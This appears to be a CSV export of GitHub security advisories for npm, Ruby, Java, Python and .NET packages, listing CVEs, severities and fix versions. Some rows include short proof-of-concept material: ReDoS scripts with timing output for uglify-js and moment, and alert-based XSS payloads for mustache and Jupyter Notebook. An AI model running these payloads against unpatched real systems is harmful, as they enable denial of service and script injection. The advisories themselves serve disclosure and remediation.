vulnerability_id,tool_id,tool_name,ghsa_id,cve_id,url,severity,published_at,summary,description,ecosystem
1673,15900,uglify-js,GHSA-c9f4-xj24-8jqx,CVE-2015-8858,https://github.com/advisories/GHSA-c9f4-xj24-8jqx,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in uglify-js,"Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.


### Proof of Concept

```
var u = require('uglify-js');
var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}

u.parse(""var a = "" + genstr(process.argv[2], ""1"") + "".1ee7;"");
```

### Results
```
$ time node test.js 10000
real	0m1.091s
user	0m1.047s
sys	0m0.039s

$ time node test.js 80000
real	0m6.486s
user	0m6.229s
sys	0m0.094s
```


## Recommendation

Update to version 2.6.0 or later.",npm
1674,17093,send,GHSA-jgqf-hwc5-hh37,CVE-2015-8859,https://github.com/advisories/GHSA-jgqf-hwc5-hh37,moderate,2017-10-24 18:33:36 UTC,Root Path Disclosure in send,"Versions of `send` prior to 0.11.2 are affected by an information leakage vulnerability which may allow an attacker to enumerate paths on the server filesystem.



## Recommendation

Update to version 0.11.1 or later.",npm
1675,16466,tar,GHSA-gfjr-3jmm-4g9v,CVE-2015-8860,https://github.com/advisories/GHSA-gfjr-3jmm-4g9v,high,2017-10-24 18:33:36 UTC,Symlink Arbitrary File Overwrite in tar,"Versions of `tar` prior to 2.0.0 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `tar` does not verify that extracted symbolic links to not resolve to targets outside of the extraction root directory.



## Recommendation

Update to version 2.0.0 or later",npm
1676,16013,handlebars,GHSA-fmr4-7g9q-7hc7,,https://github.com/advisories/GHSA-fmr4-7g9q-7hc7,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects handlebars,**Withdrawn:** Duplicate of GHSA-9prh-257w-9277,npm
1677,16290,mustache,GHSA-w3w8-37jv-2c58,CVE-2015-8862,https://github.com/advisories/GHSA-w3w8-37jv-2c58,high,2017-10-24 18:33:36 UTC,Cross-Site Scripting in mustache,"Versions of `mustache` prior to 2.2.1 are affected by a cross-site scripting vulnerability when attributes in mustache templates are not quoted.



### Example
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```


## Recommendation

Update to version 2.2.1 or later.
Alternatively, ensure that all attributes in hmustache templates are encapsulated with quotes.",npm
1678,18937,mail,GHSA-q86f-fmqf-qrf6,CVE-2015-9097,https://github.com/advisories/GHSA-q86f-fmqf-qrf6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects mail,"The mail gem before 2.5.5 for Ruby (aka A Really Ruby Mail Library) is vulnerable to SMTP command injection via CRLF sequences in a RCPT TO or MAIL FROM command, as demonstrated by CRLF sequences immediately before and after a DATA substring.",rubygems
1679,19199,archive-tar-minitar,GHSA-h5g2-38x9-4gv3,CVE-2016-10173,https://github.com/advisories/GHSA-h5g2-38x9-4gv3,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects archive-tar-minitar and minitar,Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.,rubygems
1680,16343,electron,GHSA-gvcj-pfq2-wxj7,CVE-2016-1202,https://github.com/advisories/GHSA-gvcj-pfq2-wxj7,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects electron,Untrusted search path vulnerability in Atom Electron before 0.33.5 allows local users to gain privileges via a Trojan horse Node.js module in a parent directory of a directory named on a require line.,npm
1681,15847,moment,GHSA-87vv-r9j6-g5qv,CVE-2016-4055,https://github.com/advisories/GHSA-87vv-r9j6-g5qv,moderate,2017-10-24 18:33:35 UTC,Regular Expression Denial of Service in moment,"Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.


## Proof of concept
```
var moment = require('moment');

var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=20000;i<=10000000;i=i+10000) {
    console.log(""COUNT: "" + i);
    var str = '-' + genstr(i, '1')
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    moment.duration(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
```
$ node moment.js
COUNT: 20000
LENGTH: 20002
[ 0, 618931029 ]
COUNT: 30001
LENGTH: 30003
[ 1, 401413894 ]
COUNT: 40002
LENGTH: 40004
[ 2, 437075303 ]
COUNT: 50003
LENGTH: 50005
[ 3, 824664804 ]
COUNT: 60004
LENGTH: 60006
[ 5, 651335262 ]
```


## Recommendation

Please update to version 2.11.2 or later. ",npm
1682,27892,rack-mini-profiler,GHSA-j5hj-fhc9-g24m,CVE-2016-4442,https://github.com/advisories/GHSA-j5hj-fhc9-g24m,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects rack-mini-profiler,The rack-mini-profiler gem before 0.10.1 for Ruby allows remote attackers to obtain sensitive information about allocated strings and objects by leveraging incorrect ordering of security checks.,rubygems
1683,19060,actionview,GHSA-pc3m-v286-2jwj,CVE-2016-6316,https://github.com/advisories/GHSA-pc3m-v286-2jwj,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects actionview,"Cross-site scripting (XSS) vulnerability in Action View in Ruby on Rails 3.x before 3.2.22.3, 4.x before 4.2.7.1, and 5.x before 5.0.0.1 might allow remote attackers to inject arbitrary web script or HTML via text declared as ""HTML safe"" and used as attribute values in tag handlers.",rubygems
1684,26832,doorkeeper,GHSA-3m6r-39p3-jq25,CVE-2016-6582,https://github.com/advisories/GHSA-3m6r-39p3-jq25,critical,2017-10-24 18:33:35 UTC,Doorkeeper is vulnerable to replay attacks,The Doorkeeper gem before 4.2.0 for Ruby might allow remote attackers to conduct replay attacks or revoke arbitrary tokens by leveraging failure to implement the OAuth 2.0 Token Revocation specification.,rubygems
1685,17417,jquery-ui,GHSA-hpcf-8vf9-q4gj,CVE-2016-7103,https://github.com/advisories/GHSA-hpcf-8vf9-q4gj,high,2017-10-24 18:33:35 UTC,XSS in dialog closeText in jquery-ui,"Affected versions of `jquery-ui` are vulnerable to a cross-site scripting vulnerability when arbitrary user input is supplied as the value of the `closeText` parameter in the `dialog` function. 

jQuery-UI is a library for manipulating UI elements via jQuery.

Version 1.11.4 has a cross site scripting (XSS) vulnerability in the `closeText` parameter of the `dialog`  function.  If your application passes user input to this parameter, it may be vulnerable to XSS via this attack vector.


## Recommendation

Upgrade to jQuery-UI 1.12.0 or later.",npm
1686,19257,openssl,GHSA-6h88-qjpv-p32m,CVE-2016-7798,https://github.com/advisories/GHSA-6h88-qjpv-p32m,high,2017-10-24 18:33:35 UTC,OpenSSL gem for Ruby using inadequate encryption strength,"The OpenSSL gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",rubygems
1687,34012,org.jsoup:jsoup,GHSA-m72m-mhq2-9p6c,CVE-2021-37714,https://github.com/advisories/GHSA-m72m-mhq2-9p6c,high,2021-08-23 19:42:38 UTC,Uncaught Exception in jsoup,"### Impact
_What kind of vulnerability is it? Who is impacted?_
Those using jsoup to parse untrusted HTML or XML may be vulnerable to DOS attacks. If the parser is run on user supplied input, an attacker may supply content that causes the parser to get stuck (loop indefinitely until cancelled), to complete more slowly than usual, or to throw an unexpected exception. This effect may support a denial of service attack.

### Patches
_Has the problem been patched? What versions should users upgrade to?_
Users should upgrade to jsoup 1.14.2

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_
Users may rate limit input parsing. Users should limit the size of inputs based on system resources. Users should implement thread watchdogs to cap and timeout parse runtimes.
",maven
1688,20024,notebook,GHSA-hwvq-6gjx-j797,CVE-2021-32798,https://github.com/advisories/GHSA-hwvq-6gjx-j797,critical,2021-08-23 19:40:38 UTC,Special Element Injection in notebook,"### Impact

Untrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.

### Patches

5.7.11, 6.4.1

### References

[OWASP Page on Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-rules)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.

Credit: Guillaume Jeanne from Google


### Example:

A notebook with the following content in a cell and it would display an alert when opened for the first time in Notebook (in an untrusted state):

```
{ ""cell_type"": ""code"", ""execution_count"": 0, ""metadata"": {}, ""outputs"": [ { ""data"": { ""text/html"": [ ""<select><iframe></select><img src=x: onerror=alert('xss')>\n""], ""text/plain"": [] }, ""metadata"": {}, ""output_type"": ""display_data"" } ], ""source"": [ """" ] }
````",pip
1689,20376,jupyterlab,GHSA-4952-p58q-6crx,CVE-2021-32797,https://github.com/advisories/GHSA-4952-p58q-6crx,high,2021-08-23 19:40:22 UTC,JupyterLab: XSS due to lack of sanitization of the action attribute of an html <form>,"### Impact

Untrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.

### Patches

Patched in the following versions: 3.1.4, 3.0.17, 2.3.2, 2.2.10, 1.2.21.

### References

[OWASP Page on Restricting Form Submissions](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.

Credit: Guillaume Jeanne from Google
",pip
1690,12968,Microsoft.AspNetCore.Authentication.JwtBearer,GHSA-q7cg-43mg-qp69,CVE-2021-34532,https://github.com/advisories/GHSA-q7cg-43mg-qp69,moderate,2021-08-25 14:45:28 UTC,ASP.NET Core Information Disclosure Vulnerability,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 5.0, .NET Core 3.1 and .NET Core 2.1. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

An information disclosure vulnerability exists in .NET 5.0, .NET Core 3.1 and .NET Core 2.1 where a JWT token is logged if it cannot be parsed.

### Patches

* If you're using .NET 5.0, you should download and install Runtime 5.0.9 or SDK 5.0.206 (for Visual Studio 2019 v16.8) or SDK 5.0.303 (for Visual Studio 2019 V16.10) from https://dotnet.microsoft.com/download/dotnet-core/5.0.

* If you're using .NET Core 3.1, you should download and install Runtime 3.1.18 or SDK 3.1.118 (for Visual Studio 2019 v16.4) or 3.1.412 (for Visual Studio 2019 v16.7 or later) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

* If you're using .NET Core 2.1, you should download and install Runtime 2.1.29 or SDK 2.1.525 (for Visual Studio 2019 v15.9) or 2.1.817 from https://dotnet.microsoft.com/download/dotnet-core/2.1.

* If your application is using .NET Core 2.1 running on .NET Framework see the [Updating .NET Core 2.1 on .NET Framework](#updating-2.1) section below.

### <a name=""updating-2.1""></a> Updating .NET Core 2.1 on .NET Framework
If you are running .NET Core 2.1 on .NET Framework you need to check your projects for dependencies and update them accordingly.

#### Direct dependencies

Direct dependencies are discoverable by examining your `csproj` file. They can be fixed by [editing the project file](#fixing-direct-dependencies) or using NuGet to update the dependency.

#### Transitive dependencies

Transitive dependencies occur when you add a package to your project that in turn relies on another package. For example, if Contoso publishes a package `Contoso.Utility` which, in turn, depends on `Contoso.Internals` and you add the `Contoso.Utility` package to your project now your project has a direct dependency on `Contoso.Utility` and, because `Contoso.Utility` depends 'Contoso.Internals', your application gains a transitive dependency on the `Contoso.Internals` package.

Transitive dependencies are reviewable in two ways:

* In the Visual Studio Solution Explorer window, which supports searching.
* By examining the `project.assets.json` file contained in the obj directory of your project for `csproj` based projects

The `project.assets.json` files are the authoritative list of all packages used by your project, containing both direct and transitive dependencies.

There are two ways to view transitive dependencies. You can either [use Visual Studio’s Solution Explorer](#vs-solution-explorer), or you can review [the `project.assets.json` file](#project-assets-json)).

##### <a name=""vs-solution-explorer""></a>Using Visual Studio Solution Explorer

To use Solution Explorer, open the project in Visual Studio, and then press Ctrl+; to activate the search in Solution Explorer. Search for the [vulnerable package](#affected-software) and make a note of the version numbers of any results you find.

For example, search for `Microsoft.AspNetCore.Authentication.JwtBearer` and update the package to the latest version


##### <a name=""project-assets-json""></a> Manually reviewing project.assets.json

Open the *project.assets.json* file from your project’s obj directory in your editor. We suggest you use an editor that understands JSON and allows you to collapse and expand nodes to review this file.
Visual Studio and Visual Studio Code provide JSON friendly editing.

Search the *project.assets.json* file for the [vulnerable package](#affected-software), using the format `packagename/` for each of the package names from the preceding table. If you find the assembly name in your search:

* Examine the line on which they are found, the version number is after the `/`.
* Compare to the [vulnerable versions table](#affected-software).

For example, a search result that shows `Microsoft.AspNetCore.Authentication.JwtBearer/2.1.0` is a reference to version 2.1.1 of `Microsoft.AspNetCore.Authentication.JwtBearer`.

If your *project.assets.json* file includes references to the [vulnerable package](#affected-software), then you need to fix the transitive dependencies.

If you have not found any reference to any vulnerable packages, this means either

* None of your direct dependencies depend on any vulnerable packages, or
* You have already fixed the problem by updating the direct dependencies.

#### Other Details

- Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/195
- An Issue for this can be found at https://github.com/dotnet/aspnetcore/issues/35246
- MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34532
",nuget
